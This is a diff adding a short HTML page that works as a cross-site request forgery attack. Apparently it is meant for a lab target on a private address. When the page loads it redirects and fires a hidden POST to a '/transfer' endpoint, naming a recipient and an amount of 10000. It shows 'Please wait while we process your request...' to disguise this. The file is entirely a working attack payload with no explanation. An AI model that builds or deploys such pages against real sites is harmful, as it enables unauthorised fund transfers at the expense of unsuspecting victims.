@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; URL='http://192.168.2.98:49698/transfer'" />
+    <script>
+      function sendRequest() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://192.168.2.98:49698/transfer", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.setRequestHeader("user_to", "hihihi");
+        xhr.setRequestHeader("amount", "10000");
+        xhr.send();
+      }
+      sendRequest();
+    </script>
+  </head>
+  <body>
+    <p>Please wait while we process your request...</p>
+  </body>
+</html>
